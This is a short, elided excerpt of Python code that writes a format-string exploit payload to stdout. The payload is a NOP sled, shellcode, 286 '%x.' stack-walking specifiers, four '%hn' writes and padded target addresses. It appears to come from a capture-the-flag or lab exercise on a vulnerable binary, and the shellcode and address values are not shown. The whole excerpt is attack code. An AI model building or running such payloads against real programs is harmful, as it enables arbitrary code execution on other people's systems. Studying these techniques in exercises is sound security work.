...
ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little')
...
with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(NOPSLED + SHELLCODE + b'%x.'*286 + b'%hn' + b'%x' + b'%hn' + b'%x' + b'%hn' + b'%x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
